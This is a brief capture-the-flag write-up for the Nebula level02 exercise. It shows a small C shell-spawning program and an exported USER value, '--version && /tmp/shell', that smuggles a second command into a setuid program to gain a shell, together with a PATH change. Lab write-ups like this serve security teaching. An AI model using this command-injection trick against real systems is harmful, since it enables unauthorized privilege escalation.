# [Level02](https://exploit-exercises.com/nebula/level02/)

First compine a small C program that spawns a shell and place it at `/tmp/shell`. 
We use this program and not `/bin/sh` so we can safely ignore the fake `is` `cool` "arugments", which would thrown and error with `/bin/sh`.

```c
// gcc -o shell shell.c
int main() {
  system("/bin/sh");
}
```

```bash
export PATH=/tmp:$PATH
export USER="--version && /tmp/shell"
./flag02
getflag
```
